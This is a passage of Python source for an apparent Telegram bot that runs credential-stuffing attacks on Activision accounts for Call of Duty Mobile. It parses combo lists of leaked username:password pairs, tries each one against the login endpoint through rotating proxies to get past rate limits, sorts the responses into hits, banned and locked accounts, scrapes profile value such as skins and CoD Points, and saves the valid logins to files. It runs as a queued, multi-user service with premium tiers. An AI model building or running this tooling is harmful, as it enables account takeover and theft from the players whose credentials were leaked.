                username, password = (auth.split(":", 1) + [""])[:2]
            else:
                hostport = text
                username = password = None

            if ":" not in hostport:
                return None
            host, port_str = hostport.rsplit(":", 1)
            port = int(port_str)
            if not (1 <= port <= 65535):
                return None
            if not host:
                return None

            return Proxy(
                host=host, port=port, ptype=ptype,
                username=username or None,
                password=password or None,
            )
        except (ValueError, AttributeError):
            return None

    async def get_proxy(self) -> Optional[Proxy]:
        """Get next proxy via weighted round-robin."""
        async with self._lock:
            if not self._proxies:
                return None
            # Sort by score descending periodically
            if len(self._proxies) > 1:
                self._proxies.sort(key=lambda p: p.score, reverse=True)
            proxy = self._proxies[self._index % len(self._proxies)]
            self._index += 1
            return proxy

    async def get_proxy_url(self) -> Optional[str]:
        p = await self.get_proxy()
        return p.url if p else None

    def add_proxy(self, line: str) -> bool:
        proxy = self._parse_proxy_line(line.strip())
        if proxy:
            self._proxies.append(proxy)
            self._no_proxy = False
            return True
        return False

    async def record_result(self, proxy: Optional[Proxy], success: bool, ms: float = 0.0) -> None:
        if proxy is None:
            return
        async with self._lock:
            if success:
                proxy.record_success(ms)
            else:
                proxy.record_failure()

    @property
    def count(self) -> int:
        return len(self._proxies)

    @property
    def using_proxies(self) -> bool:
        return len(self._proxies) > 0

    def status_line(self) -> str:
        if not self._proxies:
            return "No proxies (direct)"
        alive = sum(1 for p in self._proxies if p.score > 0.3)
        return f"{alive}/{len(self._proxies)} proxies healthy"


# =============================================================================
#   ACTIVISION CODM CHECKER ENGINE
# =============================================================================

class CODMChecker:
    """
    Core checking engine for CODM accounts via Activision APIs.

    Methods:
        check_account()   — Primary entry point
        _login_attempt()  — Activision SSO login
        _fetch_profile()  — Get CODM profile data after login
        _extract_info()   — Parse profile response into AccountResult
    """

    # Known error keywords from Activision
    BANNED_KEYWORDS = [
        "account has been suspended",
        "suspended",
        "account banned",
        "ban",
        "permanently",
        "violation",
    ]
    LOCKED_KEYWORDS = [
        "account locked",
        "temporarily locked",
        "security lock",
        "verify",
        "challenge",
        "mfa",
        "two-factor",
        "suspicious activity",
    ]
    WRONG_PASS_KEYWORDS = [
        "invalid credentials",
        "incorrect password",
        "wrong password",
        "authentication failed",
        "invalid username",
        "not found",
        "no account",
        "does not exist",
    ]
    RATE_LIMIT_KEYWORDS = [
        "too many requests",
        "rate limit",
        "try again later",
        "429",
        "throttle",
        "flood",
    ]

    def __init__(self, proxy_manager: ProxyManager) -> None:
        self.proxy_mgr = proxy_manager
        self._session_cache: Dict[str, str] = {}  # username → sso_token

    async def check_account(
        self, username: str, password: str, retries: int = MAX_RETRIES
    ) -> AccountResult:
        """
        Main entry: Try to log in and fetch CODM profile data.
        Falls back through multiple methods if needed.
        """
        raw = f"{username}:{password}"
        start = time.monotonic()
        proxy: Optional[Proxy] = await self.proxy_mgr.get_proxy()

        for attempt in range(1, retries + 1):
            try:
                result = await self._check_once(username, password, proxy)
                elapsed_ms = (time.monotonic() - start) * 1000
                result.elapsed_ms = elapsed_ms
                result.proxy_used = str(proxy) if proxy else "direct"
                result.raw = raw

                await self.proxy_mgr.record_result(proxy, result.status != AccountStatus.TIMEOUT, elapsed_ms)
                return result

            except asyncio.TimeoutError:
                await self.proxy_mgr.record_result(proxy, False)
                if attempt == retries:
                    return AccountResult(
                        raw=raw, username=username, password=password,
                        status=AccountStatus.TIMEOUT, detail=f"Timeout after {retries} attempts",
                        elapsed_ms=(time.monotonic() - start) * 1000,
                        proxy_used=str(proxy) if proxy else "direct",
                    )
                await asyncio.sleep(RETRY_DELAY)
                proxy = await self.proxy_mgr.get_proxy()

            except (ClientConnectorError, ServerDisconnectedError, OSError) as e:
                await self.proxy_mgr.record_result(proxy, False)
                if attempt == retries:
                    return AccountResult(
                        raw=raw, username=username, password=password,
                        status=AccountStatus.ERROR, detail=f"Connection error: {e}",
                        elapsed_ms=(time.monotonic() - start) * 1000,
                        proxy_used=str(proxy) if proxy else "direct",
                    )
                await asyncio.sleep(RETRY_DELAY)
                proxy = await self.proxy_mgr.get_proxy()

            except Exception as e:
                logger.debug(f"Unexpected error checking {username}: {e}", exc_info=True)
                return AccountResult(
                    raw=raw, username=username, password=password,
                    status=AccountStatus.ERROR, detail=f"Unexpected: {type(e).__name__}: {e}",
                    elapsed_ms=(time.monotonic() - start) * 1000,
                    proxy_used=str(proxy) if proxy else "direct",
                )

        # Should never reach here, but just in case
        return AccountResult(
            raw=raw, username=username, password=password,
            status=AccountStatus.ERROR, detail="Max retries exceeded",
        )

    async def _check_once(
        self, username: str, password: str, proxy: Optional[Proxy]
    ) -> AccountResult:
        """Single check attempt — login + profile fetch."""
        proxy_url = proxy.url if proxy else None

        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False, limit=1),
            timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT),
            headers=DEFAULT_HEADERS,
        ) as session:
            # Step 1: Login
            login_result = await self._login_attempt(session, username, password, proxy_url)
            if login_result["status"] != "ok":
                return self._map_login_error(username, password, login_result)

            sso_token = login_result.get("token", "")

            # Step 2: Fetch CODM profile
            profile = await self._fetch_codm_profile(session, sso_token, username, proxy_url)
            return self._extract_info(username, password, profile)

    async def _login_attempt(
        self, session: aiohttp.ClientSession,
        username: str, password: str, proxy_url: Optional[str]
    ) -> Dict[str, Any]:
        """
        Attempt Activision account login.
        Returns dict with status, token, and any error info.
        """
        login_payload = {
            "username": username,
            "password": password,
            "remember_me": "true",
        }

        headers = {
            **DEFAULT_HEADERS,
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
        }

        try:
            async with session.post(
                ACTIVISION_LOGIN_URL,
                data=login_payload,
                headers=headers,
                proxy=proxy_url,
                allow_redirects=True,
                ssl=False,
            ) as resp:
                status_code = resp.status
                try:
                    body = await resp.json(content_type=None)
                except (json.JSONDecodeError, ContentTypeError):
                    body = {"raw": await resp.text()}

                if status_code == 200:
                    # Look for SSO token in cookies or response
                    token = ""
                    for cookie in session.cookie_jar:
                        if "ACT_SSO_COOKIE" in cookie.key or "sso" in cookie.key.lower():
                            token = cookie.value
                            break

                    # Also check response body
                    if not token:
                        token = body.get("token", "") or body.get("sso", "") or body.get("ssoCookie", "")

                    if token:
                        return {"status": "ok", "token": token, "body": body, "code": status_code}

                    # Check if actually logged in via redirect/cookies
                    if self._check_logged_in_body(body):
                        token = body.get("ssoToken", "") or body.get("atkn", "") or "present"
                        return {"status": "ok", "token": token, "body": body, "code": status_code}

                    # Maybe credentials wrong
                    return {"status": "bad", "reason": "no_token", "body": body, "code": status_code}

                elif status_code == 401:
                    return {"status": "bad", "reason": "unauthorized", "body": body, "code": status_code}

                elif status_code == 403:
                    body_text = str(body).lower()
                    if any(k in body_text for k in self.BANNED_KEYWORDS):
                        return {"status": "banned", "reason": "banned", "body": body, "code": status_code}
                    if any(k in body_text for k in self.LOCKED_KEYWORDS):
                        return {"status": "locked", "reason": "locked", "body": body, "code": status_code}
                    return {"status": "bad", "reason": "forbidden", "body": body, "code": status_code}

                elif status_code == 429:
                    return {"status": "rate_limit", "reason": "too_many_requests", "body": body, "code": status_code}

                elif status_code in (500, 502, 503, 504):
                    return {"status": "error", "reason": f"server_error_{status_code}", "body": body, "code": status_code}

                else:
                    body_str = str(body).lower()
                    if any(k in body_str for k in self.WRONG_PASS_KEYWORDS):
                        return {"status": "bad", "reason": "wrong_credentials", "body": body, "code": status_code}
                    if any(k in body_str for k in self.RATE_LIMIT_KEYWORDS):
                        return {"status": "rate_limit", "reason": "rate_limited", "body": body, "code": status_code}
                    if any(k in body_str for k in self.BANNED_KEYWORDS):
                        return {"status": "banned", "reason": "account_banned", "body": body, "code": status_code}
                    if any(k in body_str for k in self.LOCKED_KEYWORDS):
                        return {"status": "locked", "reason": "account_locked", "body": body, "code": status_code}
                    return {"status": "error", "reason": f"http_{status_code}", "body": body, "code": status_code}

        except asyncio.TimeoutError:
            raise
        except aiohttp.ClientError as e:
            raise ClientConnectorError(None, OSError(str(e))) from e

    def _check_logged_in_body(self, body: Any) -> bool:
        """Heuristic: check if response body suggests successful auth."""
        if not isinstance(body, dict):
            return False
        indicators = ["success", "token", "user", "profile", "sso", "atkn"]
        body_str = str(body).lower()
        return any(k in body_str for k in indicators) and "error" not in body_str

    def _map_login_error(self, username: str, password: str, login_result: Dict) -> AccountResult:
        """Map a failed login result to an AccountResult."""
        raw = f"{username}:{password}"
        status_key = login_result.get("status", "error")
        reason = login_result.get("reason", "unknown")
        code = login_result.get("code", 0)

        mapping = {
            "bad":        (AccountStatus.BAD,        f"Invalid credentials ({reason})"),
            "banned":     (AccountStatus.BANNED,     f"Account banned ({reason})"),
            "locked":     (AccountStatus.LOCKED,     f"Account locked ({reason})"),
            "rate_limit": (AccountStatus.RATE_LIMIT, f"Rate limited ({reason})"),
            "error":      (AccountStatus.ERROR,      f"Server error HTTP {code} ({reason})"),
        }
        status, detail = mapping.get(status_key, (AccountStatus.UNKNOWN, reason))

        return AccountResult(
            raw=raw, username=username, password=password,
            status=status, detail=detail,
        )

    async def _fetch_codm_profile(
        self, session: aiohttp.ClientSession,
        sso_token: str, username: str, proxy_url: Optional[str]
    ) -> Dict[str, Any]:
        """
        Fetch CODM profile data using SSO token.
        Tries multiple API endpoints.
        """
        encoded_name = urllib.parse.quote(username, safe="")
        endpoints = [
            f"{ACTIVISION_API_URL}/stats/cod/v1/title/mw/platform/uno/gamer/{encoded_name}/profile/type/mp",
            f"{ACTIVISION_API_URL}/stats/cod/v1/title/mw/platform/uno/gamer/{encoded_name}/profile/type/wz",
            f"{ACTIVISION_API_URL}/stats/cod/v1/title/cw/platform/uno/gamer/{encoded_name}/profile/type/mp",
            f"{ACTIVISION_API_URL}/crm/cod/v2/title/mw/platform/uno/gamer/{encoded_name}/leaderboard/1",
        ]

        headers = {
            **DEFAULT_HEADERS,
            "Cookie": f"ACT_SSO_COOKIE={sso_token}" if sso_token != "present" else "",
        }

        for url in endpoints:
            try:
                async with session.get(
                    url,
                    headers=headers,
                    proxy=proxy_url,
                    ssl=False,
                ) as resp:
                    if resp.status == 200:
                        try:
                            data = await resp.json(content_type=None)
                            if data and isinstance(data, dict):
                                return data
                        except Exception:
                            pass
                    elif resp.status in (400, 404):
                        # Profile not found or no CODM
                        return {"_no_codm": True, "status": resp.status}
            except Exception:
                continue

        return {"_hit": True, "_no_profile": True}

    def _extract_info(
        self, username: str, password: str, profile: Dict[str, Any]
    ) -> AccountResult:
        """
        Extract meaningful data from a CODM API profile response.
        Returns a fully populated AccountResult.
        """
        raw = f"{username}:{password}"

        if profile.get("_no_codm"):
            return AccountResult(
                raw=raw, username=username, password=password,
                status=AccountStatus.NO_CODM,
                detail="Account valid but no CODM profile found",
            )

        # The account has valid login; try to extract profile data
        # Activision API wraps response in "data" key
        data = profile.get("data", profile)
        lifetime = data.get("lifetime", {})
        mp_stats = lifetime.get("mode", {}).get("mp", {}) if isinstance(lifetime, dict) else {}
        all_stats = lifetime.get("all", {}).get("properties", {}) if isinstance(lifetime, dict) else {}

        # Player info
        player_id   = str(data.get("uno", data.get("id", data.get("userId", ""))))
        level       = int(data.get("level", all_stats.get("level", 0)) or 0)
        prestige    = int(data.get("prestige", 0) or 0)
        platform    = data.get("platform", "")
        clan        = ""

        # Try to get clan from nested structure
        clan_info = data.get("clan", {})
        if isinstance(clan_info, dict):
            clan = clan_info.get("name", clan_info.get("tag", ""))
        elif isinstance(clan_info, str):
            clan = clan_info

        # Rank / season info
        rank_data = data.get("rank", {}) or {}
        if isinstance(rank_data, dict):
            rank_val  = rank_data.get("rank", 0)
            rank_name = _rank_number_to_name(int(rank_val or 0))
        else:
            rank_name = ""

        # CP (CoD Points) — not always available
        cp = int(data.get("cp", data.get("currency", data.get("coins", 0))) or 0)

        # Skins count approximation from unlocked items
        operator_skins = data.get("operatorSkins", [])
        skins_count = len(operator_skins) if isinstance(operator_skins, list) else 0
        if skins_count == 0:
            # estimate from customizations
            custom = data.get("customizations", {})
            if isinstance(custom, dict):
                skins_count = sum(
                    len(v) if isinstance(v, list) else 1
                    for v in custom.values()
                )

        # Region / last seen
        region   = data.get("region", data.get("country", ""))
        last_seen_ts = data.get("lastUpdated", data.get("updatedAt", ""))
        if last_seen_ts and str(last_seen_ts).isdigit():
            try:
                last_seen = datetime.datetime.fromtimestamp(int(last_seen_ts)).strftime("%Y-%m-%d")
            except Exception:
                last_seen = str(last_seen_ts)
        else:
            last_seen = str(last_seen_ts) if last_seen_ts else ""

        if profile.get("_no_profile"):
            # We know they're logged in but couldn't fetch profile details
            return AccountResult(
                raw=raw, username=username, password=password,
                status=AccountStatus.HIT,
                detail="Valid login — CODM profile fetch limited",
                player_id=player_id,
                level=0, rank="Unknown", cp=0, skins=0,
                platform=platform, region=region,
            )

        return AccountResult(
            raw=raw, username=username, password=password,
            status=AccountStatus.HIT,
            detail="Valid account with CODM profile",
            player_id=player_id,
            level=level,
            rank=rank_name,
            cp=cp,
            skins=skins_count,
            clan=clan,
            platform=platform,
            region=region,
            last_seen=last_seen,
            extra={"prestige": prestige},
        )


def _rank_number_to_name(rank_val: int) -> str:
    """Convert numeric rank value to CODM rank name."""
    brackets = [
        (0,   "Unranked"),
        (1,   "Rookie I"),
        (50,  "Rookie II"),
        (100, "Rookie III"),
        (200, "Veteran I"),
        (300, "Veteran II"),
        (400, "Veteran III"),
        (500, "Elite I"),
        (600, "Elite II"),
        (700, "Elite III"),
        (800, "Pro I"),
        (900, "Pro II"),
        (1000,"Pro III"),
        (1100,"Master I"),
        (1200,"Master II"),
        (1300,"Master III"),
        (1400,"Grandmaster I"),
        (1500,"Grandmaster II"),
        (1600,"Grandmaster III"),
        (1700,"Legendary"),
    ]
    result = "Unranked"
    for threshold, name in brackets:
        if rank_val >= threshold:
            result = name
        else:
            break
    return result


# =============================================================================
#   STORAGE MANAGER
# =============================================================================

class StorageManager:
    """
    Handles persistent storage for users, stats, premium status, and bans.
    All operations are async-safe via internal locks.
    """

    def __init__(self) -> None:
        self._user_lock:  asyncio.Lock = asyncio.Lock()
        self._stats_lock: asyncio.Lock = asyncio.Lock()
        self._ban_lock:   asyncio.Lock = asyncio.Lock()

        self._users:  Dict[int, UserProfile] = {}
        self._stats:  GlobalStats = GlobalStats()
        self._banned: Set[int] = set()

        # Create directories
        for d in [RESULTS_DIR, LOGS_DIR, DATA_DIR]:
            Path(d).mkdir(parents=True, exist_ok=True)

    async def load_all(self) -> None:
        await asyncio.gather(
            self._load_users(),
            self._load_stats(),
            self._load_banned(),
        )

    async def _load_users(self) -> None:
        try:
            async with aiofiles.open(USERS_FILE, "r", encoding="utf-8") as f:
                raw = await f.read()
            data = json.loads(raw)
            async with self._user_lock:
                for uid_str, udata in data.items():
                    uid = int(uid_str)
                    self._users[uid] = UserProfile.from_dict(udata)
            logger.info(f"Loaded {len(self._users)} user profiles")
        except FileNotFoundError:
            logger.info("No users file found — starting fresh")
        except Exception as e:
            logger.error(f"Error loading users: {e}")

    async def _load_stats(self) -> None:
        try:
            async with aiofiles.open(STATS_FILE, "r", encoding="utf-8") as f:
                raw = await f.read()
            data = json.loads(raw)
            self._stats = GlobalStats.from_dict(data)
            self._stats.bot_started_at = time.time()  # Reset uptime
            logger.info("Loaded global stats")
        except FileNotFoundError:
            logger.info("No stats file — starting fresh")
        except Exception as e:
            logger.error(f"Error loading stats: {e}")

    async def _load_banned(self) -> None:
        try:
            async with aiofiles.open(BANNED_FILE, "r", encoding="utf-8") as f:
                raw = await f.read()
            data = json.loads(raw)
            self._banned = set(int(x) for x in data.get("banned", []))
            logger.info(f"Loaded {len(self._banned)} banned users")
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.error(f"Error loading ban list: {e}")

    async def save_users(self) -> None:
        async with self._user_lock:
            data = {str(uid): u.to_dict() for uid, u in self._users.items()}
        try:
            async with aiofiles.open(USERS_FILE, "w", encoding="utf-8") as f:
                await f.write(json.dumps(data, indent=2))
        except Exception as e:
            logger.error(f"Error saving users: {e}")

    async def save_stats(self) -> None:
        async with self._stats_lock:
            data = self._stats.to_dict()
        try:
            async with aiofiles.open(STATS_FILE, "w", encoding="utf-8") as f:
                await f.write(json.dumps(data, indent=2))
        except Exception as e:
            logger.error(f"Error saving stats: {e}")

    async def save_banned(self) -> None:
        async with self._ban_lock:
            data = {"banned": list(self._banned)}
        try:
            async with aiofiles.open(BANNED_FILE, "w", encoding="utf-8") as f:
                await f.write(json.dumps(data, indent=2))
        except Exception as e:
            logger.error(f"Error saving ban list: {e}")

    async def save_all(self) -> None:
        await asyncio.gather(self.save_users(), self.save_stats(), self.save_banned())

    # ── User operations ──────────────────────────────────────────────────────

    async def get_user(self, user_id: int) -> Optional[UserProfile]:
        async with self._user_lock:
            return self._users.get(user_id)

    async def get_or_create_user(self, tg_user: TGUser) -> UserProfile:
        async with self._user_lock:
            uid = tg_user.id
            if uid not in self._users:
                tier = UserTier.OWNER if (
                    tg_user.username and tg_user.username.lower() == OWNER_USERNAME.lower()
                ) else UserTier.FREE
                profile = UserProfile(
                    user_id=uid,
                    username=tg_user.username or "",
                    first_name=tg_user.first_name or "",
                    tier=tier,
                )
                self._users[uid] = profile
                self._stats.total_users += 1
            else:
                profile = self._users[uid]
                profile.last_seen = time.time()
                profile.username  = tg_user.username or profile.username
                profile.first_name = tg_user.first_name or profile.first_name
            return profile

    async def update_user(self, profile: UserProfile) -> None:
        async with self._user_lock:
            self._users[profile.user_id] = profile

    async def is_banned(self, user_id: int) -> bool:
        async with self._ban_lock:
            return user_id in self._banned

    async def ban_user(self, user_id: int, reason: str = "") -> None:
        async with self._ban_lock:
            self._banned.add(user_id)
        user = await self.get_user(user_id)
        if user:
            user.tier = UserTier.BANNED
            user.banned_reason = reason
            await self.update_user(user)
        await self.save_banned()

    async def unban_user(self, user_id: int) -> None:
        async with self._ban_lock:
            self._banned.discard(user_id)
        user = await self.get_user(user_id)
        if user:
            user.tier = UserTier.FREE
            user.banned_reason = ""
            await self.update_user(user)
        await self.save_banned()

    async def set_premium(self, user_id: int, days: int = 30) -> None:
        user = await self.get_user(user_id)
        if user:
            user.tier = UserTier.PREMIUM
            user.premium_until = time.time() + (days * 86400)
            await self.update_user(user)

    async def get_all_users(self) -> List[UserProfile]:
        async with self._user_lock:
            return list(self._users.values())

    # ── Stats operations ─────────────────────────────────────────────────────

    async def record_job_complete(self, job: CheckJob) -> None:
        async with self._stats_lock:
            self._stats.total_checked += job.checked
            self._stats.total_hits    += job.hits
            self._stats.total_bad     += job.bad
            self._stats.total_errors  += job.errors
            self._stats.total_jobs    += 1
            if job.hits > 0 and job.hit_results:
                last = job.hit_results[-1]
                self._stats.last_hit_at      = time.time()
                self._stats.last_hit_account = last.username

        user = await self.get_user(job.user_id)
        if user:
            user.total_jobs    += 1
            user.total_checked += job.checked
            user.total_hits    += job.hits
            await self.update_user(user)

        await self.save_all()

    @property
    def stats(self) -> GlobalStats:
        return self._stats


# =============================================================================
#   COMBO PARSER
# =============================================================================

class ComboParser:
    """
    Parses combo/wordlist files into (username, password) tuples.
    Handles various delimiters and cleans up malformed lines.
    """

    # Common separators between username and password
    SEPARATORS = [":", "|", ";", "\t", " ", ","]

    @classmethod
    def parse_content(cls, content: str, max_lines: int = MAX_ACCOUNTS_PER_JOB) -> Tuple[
        List[Tuple[str, str]], List[str]
    ]:
        """
        Parse raw text content.
        Returns (valid_pairs, invalid_lines).
        """
        valid: List[Tuple[str, str]] = []
        invalid: List[str] = []
        seen: Set[str] = set()

        lines = content.splitlines()
        if len(lines) > max_lines:
            lines = lines[:max_lines]

        for raw_line in lines:
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue

            # Remove BOM
            line = line.lstrip("\ufeff")

            # Remove surrounding quotes
            if line.startswith('"') and line.endswith('"'):
                line = line[1:-1]

            result = cls._parse_line(line)
            if result:
                user, pwd = result
                key = f"{user}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    valid.append((user, pwd))
            else:
                invalid.append(line)

        return valid, invalid

    @classmethod
    def _parse_line(cls, line: str) -> Optional[Tuple[str, str]]:
        """Try to split a line into (username, password) pair."""
        # Try each separator
        for sep in cls.SEPARATORS:
            if sep in line:
                parts = line.split(sep, 2)  # max 2 splits → keep extra in [2]
                if len(parts) >= 2:
                    user = parts[0].strip()
                    pwd  = parts[1].strip()
                    if user and pwd:
                        # Validate: user should look like an email or alphanumeric
                        if cls._is_valid_username(user) and cls._is_valid_password(pwd):
                            return user, pwd

        return None

    @staticmethod
    def _is_valid_username(user: str) -> bool:
        if len(user) < 3 or len(user) > 200:
            return False
        # Must contain at least one alphanumeric
        if not any(c.isalnum() for c in user):
            return False
        # Reject obvious junk
        if user.startswith("http") or user.startswith("//"):
            return False
        return True

    @staticmethod
    def _is_valid_password(pwd: str) -> bool:
        if len(pwd) < 1 or len(pwd) > 500:
            return False
        return True

    @classmethod
    async def parse_file(cls, path: str, max_lines: int = MAX_ACCOUNTS_PER_JOB) -> Tuple[
        List[Tuple[str, str]], List[str], int
    ]:
        """
        Parse a file async. Returns (valid_pairs, invalid_lines, raw_line_count).
        """
        try:
            async with aiofiles.open(path, "r", encoding="utf-8", errors="ignore") as f:
                content = await f.read()
        except FileNotFoundError:
            raise ValueError(f"File not found: {path}")
        except PermissionError:
            raise ValueError(f"Permission denied: {path}")

        raw_count = len(content.splitlines())
        valid, invalid = cls.parse_content(content, max_lines)
        return valid, invalid, raw_count


# =============================================================================
#   RESULT FILE BUILDER
# =============================================================================

class ResultFileBuilder:
    """Builds output files for job results."""

    @staticmethod
    async def write_results(job: CheckJob) -> Dict[str, Optional[str]]:
        """
        Write hits, bad, and errors to separate files.
        Returns dict of category → file path (or None if empty).
        """
        job_dir = Path(RESULTS_DIR) / job.job_id
        job_dir.mkdir(parents=True, exist_ok=True)

        paths: Dict[str, Optional[str]] = {
            "hits":   None,
            "bad":    None,
            "errors": None,
        }

        if job.hit_results:
            paths["hits"] = await ResultFileBuilder._write_category(
                job_dir / "hits.txt",
                job.hit_results,
                header=f"# Insta See Eng — HITS — Job {job.job_id[:8]}\n"
                       f"# Generated: {datetime.datetime.utcnow().isoformat()}\n"
                       f"# Total: {len(job.hit_results)}\n"
                       f"# Owner: @JAYYYTTTTTTTtt\n"
                       f"# {'─' * 50}\n",
            )

        if job.bad_results:
            paths["bad"] = await ResultFileBuilder._write_category(
                job_dir / "bad.txt",
                job.bad_results,
                header=f"# Insta See Eng — BAD — Job {job.job_id[:8]}\n"
                       f"# Generated: {datetime.datetime.utcnow().isoformat()}\n"
                       f"# Total: {len(job.bad_results)}\n"
                       f"# {'─' * 50}\n",
            )

        if job.error_results:
            paths["errors"] = await ResultFileBuilder._write_category(
                job_dir / "errors.txt",
                job.error_results,
                header=f"# Insta See Eng — ERRORS — Job {job.job_id[:8]}\n"
                       f"# Generated: {datetime.datetime.utcnow().isoformat()}\n"
                       f"# Total: {len(job.error_results)}\n"
                       f"# {'─' * 50}\n",
            )

        return paths

    @staticmethod
    async def _write_category(
        path: Path, results: List[AccountResult], header: str = ""
    ) -> str:
        async with aiofiles.open(path, "w", encoding="utf-8") as f:
            if header:
                await f.write(header)
            for r in results:
                await f.write(r.to_line() + "\n")
        return str(path)

    @staticmethod
    async def write_json_report(job: CheckJob) -> str:
        """Write a full JSON report for the job."""
        job_dir = Path(RESULTS_DIR) / job.job_id
        job_dir.mkdir(parents=True, exist_ok=True)
        path = job_dir / "report.json"

        report = {
            "job_id":      job.job_id,
            "user_id":     job.user_id,
            "total":       job.total,
            "checked":     job.checked,
            "hits":        job.hits,
            "bad":         job.bad,
            "errors":      job.errors,
            "hit_rate":    f"{job.hits/job.total*100:.2f}%" if job.total else "0%",
            "elapsed_sec": round(job.elapsed, 2),
            "speed_cps":   round(job.speed, 2),
            "created_at":  datetime.datetime.fromtimestamp(job.created_at).isoformat(),
            "started_at":  datetime.datetime.fromtimestamp(job.started_at).isoformat() if job.started_at else None,
            "finished_at": datetime.datetime.fromtimestamp(job.finished_at).isoformat() if job.finished_at else None,
            "results": [r.to_dict() for r in job.hit_results],
        }

        async with aiofiles.open(path, "w", encoding="utf-8") as f:
            await f.write(json.dumps(report, indent=2))

        return str(path)


# =============================================================================
#   JOB QUEUE MANAGER
# =============================================================================

class JobQueueManager:
    """
    Central async queue for processing check jobs.
    Supports multiple worker coroutines running in parallel.
    Each job is a CheckJob dataclass.
    Workers pull jobs from the queue and process accounts in batches.
    """

    def __init__(
        self,
        checker: CODMChecker,
        storage: StorageManager,
        num_workers: int = MAX_WORKERS,
    ) -> None:
        self.checker      = checker
        self.storage      = storage
        self.num_workers  = num_workers

        self._queue:         asyncio.Queue[CheckJob] = asyncio.Queue(maxsize=QUEUE_MAX_SIZE)
        self._active_jobs:   Dict[str, CheckJob]     = {}
        self._user_jobs:     Dict[int, str]          = {}  # user_id → job_id
        self._lock:          asyncio.Lock             = asyncio.Lock()
        self._worker_tasks:  List[asyncio.Task]       = []
        self._running:       bool                     = False
        self._progress_tasks: Dict[str, asyncio.Task] = {}

        # Callback hooks (set by bot)
        self.on_progress: Optional[Callable[[CheckJob, int], Coroutine]] = None
        self.on_complete: Optional[Callable[[CheckJob], Coroutine]]      = None
        self.on_hit:      Optional[Callable[[CheckJob, AccountResult], Coroutine]] = None

    async def start(self) -> None:
        """Start all worker coroutines."""
        self._running = True
        for i in range(self.num_workers):
            task = asyncio.create_task(
                self._worker(i), name=f"worker-{i}"
            )
            self._worker_tasks.append(task)
        logger.info(f"Started {self.num_workers} queue workers")

    async def stop(self) -> None:
        """Gracefully stop all workers."""
        self._running = False
        for _ in self._worker_tasks:
            await self._queue.put(None)  # type: ignore — sentinel
        await asyncio.gather(*self._worker_tasks, return_exceptions=True)
        self._worker_tasks.clear()
        logger.info("Queue workers stopped")

    async def submit_job(self, job: CheckJob) -> bool:
        """Submit a new job to the queue. Returns False if queue is full."""
        if self._queue.full():
            return False

        async with self._lock:
            self._active_jobs[job.job_id] = job
            self._user_jobs[job.user_id]  = job.job_id

        await self._queue.put(job)
        logger.info(f"Job {job.job_id[:8]} queued ({job.total} accounts, user {job.user_id})")
        return True

    async def cancel_user_job(self, user_id: int) -> Optional[str]:
        """Cancel the active job for a user. Returns job_id if found."""
        async with self._lock:
            job_id = self._user_jobs.get(user_id)
            if not job_id:
                return None
            job = self._active_jobs.get(job_id)
            if not job:
                return None
            job.cancel_event.set()
            job.status = JobStatus.CANCELLED
            return job_id

    async def get_user_job(self, user_id: int) -> Optional[CheckJob]:
        async with self._lock:
            job_id = self._user_jobs.get(user_id)
            if not job_id:
                return None
            return self._active_jobs.get(job_id)

    async def pause_user_job(self, user_id: int) -> bool:
        async with self._lock:
            job_id = self._user_jobs.get(user_id)
            if not job_id:
                return False
            job = self._active_jobs.get(job_id)
            if not job or job.status != JobStatus.RUNNING:
                return False
            job.pause_event.clear()
            job.status = JobStatus.PAUSED
            return True

    async def resume_user_job(self, user_id: int) -> bool:
        async with self._lock:
            job_id = self._user_jobs.get(user_id)
            if not job_id:
                return False
            job = self._active_jobs.get(job_id)
            if not job or job.status != JobStatus.PAUSED:
                return False
            job.pause_event.set()
            job.status = JobStatus.RUNNING
            return True

    def queue_size(self) -> int:
        return self._queue.qsize()

    def active_count(self) -> int:
        return sum(1 for j in self._active_jobs.values() if j.status == JobStatus.RUNNING)

    def position_in_queue(self, user_id: int) -> int:
        """Returns 0 if not in queue, else 1-based position."""
        # Since asyncio.Queue doesn't expose items, we track order separately
        job_id = self._user_jobs.get(user_id)
        if not job_id:
            return 0
        job = self._active_jobs.get(job_id)
        if not job or job.status != JobStatus.QUEUED:
            return 0
        return 1  # Simplified — true position tracking would need a deque

    # ── Worker ───────────────────────────────────────────────────────────────

    async def _worker(self, worker_id: int) -> None:
        """Worker coroutine: pulls jobs from queue and processes them."""
        logger.debug(f"Worker {worker_id} started")
        while self._running:
            try:
                job = await asyncio.wait_for(self._queue.get(), timeout=5.0)
            except asyncio.TimeoutError:
                continue

            if job is None:  # Sentinel — shutdown signal
                break

            try:
                await self._process_job(job, worker_id)
            except Exception as e:
                logger.error(f"Worker {worker_id} job error: {e}", exc_info=True)
                job.status = JobStatus.FAILED
            finally:
                self._queue.task_done()
                async with self._lock:
                    self._active_jobs.pop(job.job_id, None)
                    if self._user_jobs.get(job.user_id) == job.job_id:
                        del self._user_jobs[job.user_id]

        logger.debug(f"Worker {worker_id} stopped")

    async def _process_job(self, job: CheckJob, worker_id: int) -> None:
        """Process all accounts in a job with concurrent sub-workers."""
        job.status     = JobStatus.RUNNING
        job.started_at = time.time()
        logger.info(f"Worker {worker_id} processing job {job.job_id[:8]} ({job.total} accounts)")

        # Start progress update loop
        progress_task = asyncio.create_task(
            self._progress_loop(job), name=f"progress-{job.job_id[:8]}"
        )

        # Process accounts in parallel batches
        semaphore = asyncio.Semaphore(MAX_WORKERS)
        tasks: List[asyncio.Task] = []

        for username, password in job.accounts:
            if job.cancel_event.is_set():
                break

            # Wait if paused
            await job.pause_event.wait()

            task = asyncio.create_task(
                self._check_one(job, username, password, semaphore)
            )
            tasks.append(task)

            # Prevent memory explosion on very large jobs
            if len(tasks) >= MAX_WORKERS * 4:
                done, pending = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
                tasks = list(pending)

        # Wait for remaining tasks
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)

        job.status      = JobStatus.DONE if not job.cancel_event.is_set() else JobStatus.CANCELLED
        job.finished_at = time.time()

        # Stop progress task
        progress_task.cancel()
        with suppress(asyncio.CancelledError):
            await progress_task

        # Save stats
        await self.storage.record_job_complete(job)

        # Final callback
        if self.on_complete:
            try:
                await self.on_complete(job)
            except Exception as e:
                logger.error(f"on_complete callback error: {e}")

        logger.info(
